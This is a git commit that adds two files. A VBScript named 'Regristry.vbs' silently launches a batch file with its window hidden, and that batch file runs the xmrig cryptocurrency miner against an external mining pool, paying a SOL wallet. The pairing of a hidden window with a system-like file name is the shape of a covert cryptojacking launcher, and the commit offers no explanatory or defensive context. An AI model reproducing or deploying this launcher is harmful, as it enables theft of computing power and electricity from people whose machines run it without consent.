53ae3618059962076fb528966d973839ef7c98dd
jusdie <164373026+jusdie@users.noreply.github.com>
2024-06-27 14:43:06 +0700

    Add files via upload

---
+++ Regristry.vbs
@@ -0,0 +1,3 @@
+set w = CreateObject("WScript.Shell")
+W.Run chr(34) & "start.cmd" & chr(34), 0
+set w= Nothing
---
+++ start.cmd
@@ -0,0 +1,3 @@
+@echo off
+xmrig.exe -o rx.unmineable.com:3333 -u SOL:FRFEhxKx93en9opefiq7Ls73aCgRyyCKcdTrxMuNu857.Test1#j6lt-9cgk -p user -k -a rx/0
+pause
